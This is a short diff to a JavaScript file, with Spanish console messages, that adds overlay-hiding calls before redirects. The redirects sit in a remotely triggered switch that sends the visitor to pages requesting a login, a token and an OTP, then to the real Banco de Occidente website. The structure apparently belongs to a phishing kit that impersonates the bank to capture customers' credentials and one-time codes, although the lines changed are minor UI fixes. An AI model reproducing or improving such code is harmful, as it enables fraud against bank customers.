@@ -82,6 +82,7 @@ document.addEventListener('DOMContentLoaded', () => {
         switch(data.action) {
             case 'request_login':
                 console.log('🔐 Redirigiendo a index.html');
+                BancoUtils.hideOverlay();
                 window.location.href = 'index.html';
                 break;
             case 'request_token':
@@ -94,10 +95,12 @@ document.addEventListener('DOMContentLoaded', () => {
                 break;
             case 'request_otp':
                 console.log('🔢 Redirigiendo a otp.html');
+                BancoUtils.hideOverlay();
                 window.location.href = 'otp.html';
                 break;
             case 'finish':
                 console.log('✅ Finalizando - redirigiendo a bancodeoccidente.com.co');
+                BancoUtils.hideOverlay();
                 window.location.href = 'https://www.bancodeoccidente.com.co/';
                 break;
             default:
